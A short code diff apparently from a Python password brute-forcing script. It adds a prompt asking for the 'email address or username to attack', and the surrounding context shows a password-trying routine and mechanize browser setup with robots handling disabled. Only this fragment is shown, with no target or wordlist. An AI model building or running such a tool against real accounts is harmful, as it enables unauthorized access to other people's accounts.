@@ -45,6 +45,7 @@ def try_password(self, email, password):
         print ('Password found: %s' % password )
         sys.exit()
 os.system('clear')
+email = input('Email address or username to attack:')
 browser = mechanize.Browser()
 browser.set_handle_robots(False)
 cookies = mechanize.CookieJar()
